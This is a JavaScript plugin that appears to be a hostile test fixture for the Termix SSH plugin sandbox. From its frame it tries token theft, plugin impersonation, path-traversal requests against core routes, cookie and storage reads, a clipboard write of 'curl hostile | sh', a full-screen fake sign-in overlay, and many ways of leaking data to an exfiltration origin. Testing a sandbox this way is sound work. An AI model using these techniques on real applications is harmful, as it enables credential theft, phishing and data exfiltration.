// Attacks the shell from inside a plugin frame. Calls go straight to the
// shell over postMessage, skipping the frame runtime's own checks, so only
// the shell's checks stand in the way. Results go to the plugin's own
// backend; the runner also watches the page and an outside origin.
import { createElement, useEffect } from "react";
import { usePluginComponent } from "@termix-ssh/plugin-sdk/frontend";

const CH = "termix-frame";
let nextId = 1_500_000_000;
const waiting = new Map();

window.addEventListener("message", (event) => {
  if (event.source !== window.parent) return;
  const message = event.data;
  if (!message || message.ch !== CH || message.t !== "reply") return;
  const waiter = waiting.get(message.id);
  if (!waiter) return;
  waiting.delete(message.id);
  if (message.ok) waiter.resolve(message.value);
  else waiter.reject(new Error(message.error ?? "refused"));
});

/** A call to the shell, as raw as a frame can send it. */
function raw(method, args = [], extra = {}) {
  return new Promise((resolve, reject) => {
    const id = nextId++;
    waiting.set(id, { resolve, reject });
    window.parent.postMessage(
      { ch: CH, t: "call", id, method, args, ...extra },
      "*",
    );
    setTimeout(() => {
      if (waiting.delete(id)) reject(new Error("no reply"));
    }, 5000);
  });
}

function short(value) {
  try {
    return String(
      typeof value === "string" ? value : JSON.stringify(value),
    ).slice(0, 500);
  } catch {
    return String(value).slice(0, 500);
  }
}

async function attempt(fn) {
  try {
    const value = await fn();
    return { worked: true, detail: short(value) };
  } catch (error) {
    return { worked: false, detail: short(error?.message ?? error) };
  }
}

function jwtPlugin(token) {
  const part = String(token ?? "").split(".")[1] ?? "";
  const json = atob(part.replace(/-/g, "+").replace(/_/g, "/"));
  return JSON.parse(json).pluginId;
}

/** A core request through the shell; anything below 400 got through. */
async function core(method, path, headers) {
  const response = await raw("http", [{ method, path, headers }]);
  if (!response || response.status >= 400) {
    throw new Error(`status ${response?.status}`);
  }
  return `status ${response.status}`;
}

function wait(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function backgroundAttacks(app, exfil) {
  const init = await raw("init");
  const base = String(init.baseUrl ?? "").replace(/\/+$/, "");
  const token = await raw("token");
  const value = token?.value ?? token;
  const r = {};

  // ---- tokens and identity ----
  r["frame.token-is-own"] = await attempt(async () => {
    const pluginId = jwtPlugin(value);
    if (pluginId === "hostile-frame") throw new Error("own token");
    return pluginId;
  });
  r["frame.token-victim-route"] = await attempt(async () => {
    const response = await fetch(`${base}/plugin-api/hostile-victim/marker`, {
      headers: { Authorization: `Bearer ${value}` },
    });
    if (!response.ok) throw new Error(`status ${response.status}`);
    return response.text();
  });
  r["frame.pose-plugin"] = await attempt(async () => {
    const other = await raw("token", [], {
      pluginId: "hostile-victim",
      plugin: "hostile-victim",
    });
    const pluginId = jwtPlugin(other?.value ?? other);
    if (pluginId !== "hostile-victim") throw new Error(`got ${pluginId}`);
    return pluginId;
  });
  r["frame.fake-hello"] = await attempt(async () => {
    window.parent.postMessage(
      { ch: CH, t: "hello", role: "view", key: "hostile-victim" },
      "*",
    );
    await wait(300);
    const again = await raw("init");
    if (again.pluginId === "hostile-frame" && again.role !== "view") {
      throw new Error("still the background frame of hostile-frame");
    }
    return again;
  });

  // ---- reaching past the frame ----
  r["frame.read-parent"] = await attempt(() => window.parent.document.cookie);
  r["frame.read-parent-storage"] = await attempt(() =>
    window.parent.localStorage.length.toString(),
  );
  r["frame.read-siblings"] = await attempt(() => {
    const read = [];
    for (let i = 0; i < window.parent.frames.length; i++) {
      const frame = window.parent.frames[i];
      if (frame === window) continue;
      try {
        read.push(frame.document.body.innerHTML.slice(0, 100));
      } catch {
        // cross origin, as it should be
      }
    }
    if (read.length === 0) throw new Error("no sibling readable");
    return read;
  });
  r["frame.cookie"] = await attempt(() => {
    const text = document.cookie;
    if (!text) throw new Error("no cookies");
    return text;
  });
  r["frame.storage-shell-keys"] = await attempt(() => {
    const found = [];
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      const item = String(localStorage.getItem(key) ?? "");
      if (/^eyJ/.test(item) || /jwt|token|session/i.test(key)) found.push(key);
    }
    if (found.length === 0) throw new Error("only its own storage");
    return found;
  });
  r["frame.indexeddb"] = await attempt(
    () =>
      new Promise((resolve, reject) => {
        const request = indexedDB.open("hostile");
        request.onsuccess = () => resolve("opened");
        request.onerror = () => reject(request.error);
      }),
  );
  r["frame.popup"] = await attempt(() => {
    const opened = window.open(`${exfil}/popup`);
    if (!opened) throw new Error("no window");
    return "opened";
  });
  r["frame.top-nav"] = await attempt(() => {
    window.top.location.href = `${exfil}/topnav`;
    return "navigated";
  });

  // ---- shell calls ----
  r["shell.open-url"] = await attempt(() =>
    raw("openUrl", [`${exfil}/openurl`]),
  );
  r["shell.download"] = await attempt(() =>
    raw("download", [new Blob(["hostile"]), "hostile.exe"]),
  );
  r["shell.clipboard-read"] = await attempt(() => raw("clipboard.read"));
  r["shell.clipboard-write"] = await attempt(() =>
    raw("clipboard.write", ["curl hostile | sh"]),
  );
  r["shell.step-up"] = await attempt(() => raw("stepUp"));
  r["shell.diagnostics-open"] = await attempt(() =>
    raw("diagnostics.open", [{ pluginId: "hostile-victim" }]),
  );
  r["shell.sign-out"] = await attempt(() => raw("session.signOut"));
  r["shell.passkey"] = await attempt(() => raw("passkey.run", ["x", {}]));
  r["shell.serial"] = await attempt(() =>
    raw("port.request", [{}, () => {}, () => {}]),
  );
  r["shell.host-password"] = await attempt(() => raw("hostPassword", [1]));
  r["shell.invoke-victim"] = await attempt(() =>
    raw("invokeAction", ["hostile-victim.secret"]),
  );
  r["shell.invoke-terminal"] = await attempt(() =>
    raw("invokeAction", ["terminal.sendToActive", "echo hostile\n"]),
  );
  r["shell.keybinding"] = await attempt(() =>
    raw("keybinding.run", [{ type: "hostile-victim.secret" }]),
  );

  // ---- core requests off the list ----
  const corePaths = {
    "core.users-list": ["GET", "/users/list"],
    "core.victim-settings": ["GET", "/plugins/hostile-victim/settings/admin"],
    "core.victim-settings-put": [
      "PUT",
      "/plugins/hostile-victim/settings/admin",
    ],
    "core.encoded-slash": [
      "GET",
      "/plugins/hostile-frame%2F..%2Fhostile-victim/settings/admin",
    ],
    "core.dot-dot": [
      "GET",
      "/plugins/hostile-frame/settings/../../hostile-victim/settings/admin",
    ],
    "core.encoded-dots": [
      "GET",
      "/plugins/hostile-frame/settings/%2e%2e/%2e%2e/hostile-victim/settings/admin",
    ],
    "core.double-encoded": [
      "GET",
      "/plugins/hostile-frame/settings/%252e%252e/admin",
    ],
    "core.backslash": [
      "GET",
      "/plugins/hostile-frame\\..\\hostile-victim/settings/admin",
    ],
    "core.absolute-url": ["GET", "http://127.0.0.1/users/me"],
    "core.protocol-relative": ["GET", "//127.0.0.1/users/me"],
    "core.upper-case": ["GET", "/USERS/list"],
    "core.rotate-key": ["POST", "/encryption/rotate-key"],
    "core.victim-operation": ["POST", "/operations/hostile-victim.secret/run"],
    "core.revoke-keys": ["POST", "/users/api-keys/mine/revoke-all"],
    "core.plugin-state": ["PATCH", "/plugins/hostile-victim/state"],
  };
  for (const [id, [method, path]] of Object.entries(corePaths)) {
    r[id] = await attempt(() => core(method, path));
  }
  r["core.header-impersonate"] = await attempt(async () => {
    const response = await raw("http", [
      {
        method: "GET",
        path: "/users/me",
        headers: {
          "X-Admin-Target-User": "someone",
          Authorization: "Bearer forged",
        },
      },
    ]);
    if (response.status >= 400) throw new Error(`status ${response.status}`);
    const text = new TextDecoder().decode(response.body);
    if (!text.includes("someone") && !text.includes("forged")) {
      throw new Error("headers were dropped");
    }
    return text;
  });

  // ---- data to another origin ----
  const leaks = {
    "leak.img": () => {
      const image = new Image();
      image.src = `${exfil}/img`;
      document.body.appendChild(image);
    },
    "leak.css": () => {
      const style = document.createElement("style");
      style.textContent = `body{background-image:url("${exfil}/css")}`;
      document.head.appendChild(style);
    },
    "leak.css-import": () => {
      const style = document.createElement("style");
      style.textContent = `@import url("${exfil}/import");`;
      document.head.appendChild(style);
    },
    "leak.font": () => {
      const style = document.createElement("style");
      style.textContent = `@font-face{font-family:hx;src:url("${exfil}/font")}body{font-family:hx}`;
      document.head.appendChild(style);
      document.body.appendChild(document.createTextNode("x"));
    },
    "leak.video": () => {
      const video = document.createElement("video");
      video.src = `${exfil}/video`;
      document.body.appendChild(video);
    },
    "leak.audio": () => {
      const audio = document.createElement("audio");
      audio.src = `${exfil}/audio`;
      document.body.appendChild(audio);
    },
    "leak.iframe": () => {
      const frame = document.createElement("iframe");
      frame.src = `${exfil}/iframe`;
      document.body.appendChild(frame);
    },
    "leak.svg-image": () => {
      const box = document.createElement("div");
      box.innerHTML = `<svg><image href="${exfil}/svg"></image></svg>`;
      document.body.appendChild(box);
    },
    "leak.prefetch": () => {
      const link = document.createElement("link");
      link.rel = "prefetch";
      link.href = `${exfil}/prefetch`;
      document.head.appendChild(link);
    },
    "leak.stylesheet": () => {
      const link = document.createElement("link");
      link.rel = "stylesheet";
      link.href = `${exfil}/stylesheet`;
      document.head.appendChild(link);
    },
    "leak.beacon": () => navigator.sendBeacon(`${exfil}/beacon`, "x"),
    "leak.fetch": () => fetch(`${exfil}/fetch`).catch(() => {}),
    "leak.websocket": () => {
      new WebSocket(`${exfil.replace(/^http/, "ws")}/websocket`);
    },
    "leak.event-source": () => {
      new EventSource(`${exfil}/eventsource`);
    },
    "leak.form": () => {
      const form = document.createElement("form");
      form.action = `${exfil}/form`;
      form.method = "POST";
      document.body.appendChild(form);
      form.submit();
    },
    "leak.worker": () => {
      const code = `fetch(${JSON.stringify(`${exfil}/worker`)}).catch(()=>{})`;
      new Worker(URL.createObjectURL(new Blob([code])));
    },
    "leak.object": () => {
      const object = document.createElement("object");
      object.data = `${exfil}/object`;
      document.body.appendChild(object);
    },
  };
  for (const [id, run] of Object.entries(leaks)) {
    try {
      await run();
      r[id] = { worked: false, detail: "sent; the runner counts arrivals" };
    } catch (error) {
      r[id] = { worked: false, detail: short(error?.message ?? error) };
    }
  }

  // ---- toasts: the runner counts what shows ----
  for (let i = 0; i < 60; i++) {
    void raw("toast", ["info", `hostile toast ${i}`]).catch(() => {});
  }

  // Cover the whole shell, the way a fake sign in page would.
  window.parent.postMessage(
    { ch: CH, t: "event", name: "overlay", data: { active: true } },
    "*",
  );

  await app.api.post("/report", { role: "background", results: r });

  // Open its own view once the runner is past the setup screen.
  // A slow setup on a busy lab can take minutes.
  for (let i = 0; i < 600; i++) {
    const { data: state } = await app.api.get("/go");
    if (state.go) break;
    await wait(500);
  }
  const opened = await attempt(() =>
    raw("tabs.openSingletonTab", ["hostile-frame"]),
  );
  await app.api.post("/report", { role: "setup", results: { opened } });

  // Last, and known to get through: the frame navigates itself away. Late
  // enough for the runner to check the view first.
  await wait(20_000);
  window.location.href = `${exfil}/selfnav`;
}

function OverlayTab() {
  const Panel = usePluginComponent("hostile-victim.panel");
  useEffect(() => {
    document.documentElement.dataset.hostile = "view";
  }, []);
  return createElement(
    "div",
    {
      "data-hostile": "overlay",
      style: {
        position: "fixed",
        left: "-4000px",
        top: "-4000px",
        width: "12000px",
        height: "12000px",
      },
    },
    Panel ? createElement(Panel, {}) : "no panel",
  );
}

export function activate(app) {
  app.registerTab("hostile-frame", OverlayTab, {
    titleKey: "tab.title",
    singleton: true,
    hostless: true,
  });
  // Only the background frame runs the attacks.
  if (!/role=background/.test(window.location.hash)) return;
  // A timer started in activate keeps the shell from stopping this frame as
  // idle while it waits for the runner, even with many other frames up.
  setInterval(() => {}, 60_000);
  void (async () => {
    const { data } = await app.api.get("/config");
    if (!data.exfilOrigin) return;
    await backgroundAttacks(app, data.exfilOrigin);
  })();
}
